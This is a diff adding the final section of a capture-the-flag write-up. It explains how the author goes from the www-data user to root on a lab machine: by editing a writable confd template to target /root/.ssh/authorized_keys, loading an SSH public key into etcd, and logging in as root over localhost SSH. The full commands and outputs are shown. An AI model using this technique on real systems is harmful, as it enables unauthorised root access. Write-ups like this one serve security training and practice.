@@ -176,4 +176,125 @@ www-data 13155  0.0  0.1   7864  2812 pts/2    R+   12:07   0:00 ps -auxwwwwww
 www-data@pcprincipal:/var/www/html/gila/tmp$ 
 ```
 
-Some strange process `confd` seems we need to focus on that 
+Some strange process `confd` seems we need to focus on that.
+
+### ETCD & CONFD
+
+Confd is a lightweight configuration management tool. By querying Etcd, combining with the configuration template engine, it keeps the local configuration up to date, and has a regular detection mechanism to automatically reload configuration changes.
+
+The default configuration folder is under `/etc/confd` so let change directory to the folder.
+
+![image](https://user-images.githubusercontent.com/69868171/145209501-d296a294-ff39-4bb3-9003-0c1e3ecb3938.png)
+
+seems `etsctf_authorized_keys.toml` is writable so let see what we have in it.
+
+```
+www-data@pcprincipal:/etc/confd/conf.d$ cat etsctf_authorized_keys.toml
+[template]
+uid = 1001
+mode = "0400"
+src = "authorized_keys.tmpl"
+dest = "/home/ETSCTF/.ssh/authorized_keys"
+keys = [
+    "/ETSCTF/authorized_keys",
+]
+www-data@pcprincipal:/etc/confd/conf.d$ 
+
+```
+
+We have `uid`  which is the user id `ETSCTF` we want the file to be owned, a `mode` for permissions, an `src` template, a destination file `dest` and the `keys` that will be queried for i think.
+
+
+I think this seems to be our way to escalate. These two files are responsible for generating an `authorized_keys` file for the user `ETSCTF` with the value of the `etcd` key `/ETSCTF/authorized_keys`.
+
+So the new plan is to change the `toml` file in order to generate the ssh keys for the user root.
+
+```
+www-data@pcprincipal:/etc/confd/conf.d$ cat etsctf_authorized_keys.toml
+[template]
+uid = 0
+mode = "0644"
+src = "authorized_keys.tmpl"
+dest = "/root/.ssh/authorized_keys"
+keys = [
+    "/ETSCTF/authorized_keys",
+]
+```
+
+Now the next step to generate SSH key.
+
+```
+www-data@pcprincipal:/tmp$ cd /tmp
+www-data@pcprincipal:/tmp$ mkdir .ssh
+www-data@pcprincipal:/tmp$ ssh-keygen -t rsa
+Generating public/private rsa key pair.
+Enter file in which to save the key (/var/www/.ssh/id_rsa): /tmp/.ssh/id_rsa
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /tmp/.ssh/id_rsa.
+Your public key has been saved in /tmp/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:4/adt/ftoqKFT03my39IBGfIOX8Et0O5OV1d/+5JJIU www-data@pcprincipal.echocity-f.com
+The key's randomart image is:
++---[RSA 2048]----+
+|           . o.o*|
+|            * =o*|
+|             E =*|
+|              ++=|
+|        S   oo oo|
+|       . o =  +. |
+|        + o o. o.|
+|       . =.o o=.=|
+|        ..o.*+oB*|
++----[SHA256]-----+
+www-data@pcprincipal:/tmp$ 
+```
+
+Now let set up the public key with;
+
+```
+etcdctl set /ETSCTF/authorized_keys "$(</tmp/.ssh/id_rsa.pub)";
+```
+
+```
+www-data@pcprincipal:/tmp$ etcdctl set /ETSCTF/authorized_keys "$(</tmp/.ssh/id_rsa.pub)";
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZM8jwVsQmpgDjoecnszJI6uji8aPI17AQx4y/TnuPfCP3z+fijaJYLYuyOKFZ+/ViZDnRY0m+/cFm8EBElpIFZhc4VeII23xjjqdhAoe+k90iFJ8ZJiyFb/8igw+fxw2796eaFEmCpkV8ct2BCiJ4KO9v4uWX2Fc+9pxDeR1rwfHYfokaqFL4Iz6oOLx0TmONGCFvoHcCTScTUvRiCY+mVj5QyXAcBTLA5ipXAVF4dOxxdyM/8NSwf4g4u4Y60uXE+HUAwH9jAETdz7p/KLdZbsXJcNgY5uNquGLtkIgr7CNiCkJNMfOrRf4XBBZMVYFiK4teec+PNN/oMFxflI1R www-data@pcprincipal.echocity-f.com
+www-data@pcprincipal:/tmp$ cd .ssh
+www-data@pcprincipal:/tmp/.ssh$ ls
+id_rsa  id_rsa.pub
+www-data@pcprincipal:/tmp/.ssh$ chmod 600 id_rsa
+```
+
+Now let try using SSH with the private key to access the root user.
+
+```
+ssh -i id_rsa root@localhost
+```
+Do we have SSH port open locally?? Yes we do.
+
+```
+
+www-data@pcprincipal:/tmp/.ssh$ ss -tulpn
+Netid             State               Recv-Q              Send-Q                           Local Address:Port                            Peer Address:Port             
+udp               UNCONN              0                   0                                   127.0.0.11:41712                                0.0.0.0:*                
+tcp               LISTEN              0                   128                                 127.0.0.11:45549                                0.0.0.0:*                
+tcp               LISTEN              0                   128                                    0.0.0.0:80                                   0.0.0.0:*                
+tcp               LISTEN              0                   128                                  127.0.0.1:22                                   0.0.0.0:*                
+tcp               LISTEN              0                   80                                   127.0.0.1:3306                                 0.0.0.0:*                
+tcp               LISTEN              0                   128                                  127.0.0.1:2379                                 0.0.0.0:*                
+tcp               LISTEN              0                   128                                  127.0.0.1:2380                                 0.0.0.0:*                
+www-data@pcprincipal:/tmp/.ssh$ 
+```
+
+Now let hit it.
+
+![image](https://user-images.githubusercontent.com/69868171/145212839-e582d8b9-39c8-4abd-a220-9cdf5a50f471.png)
+
+Boom in and done.
+
+
+Greeting From [Muzec](https://twitter.com/muzec_saminu)
+
+<br> <br>
+[Back To Home](../index.md)
+<br>
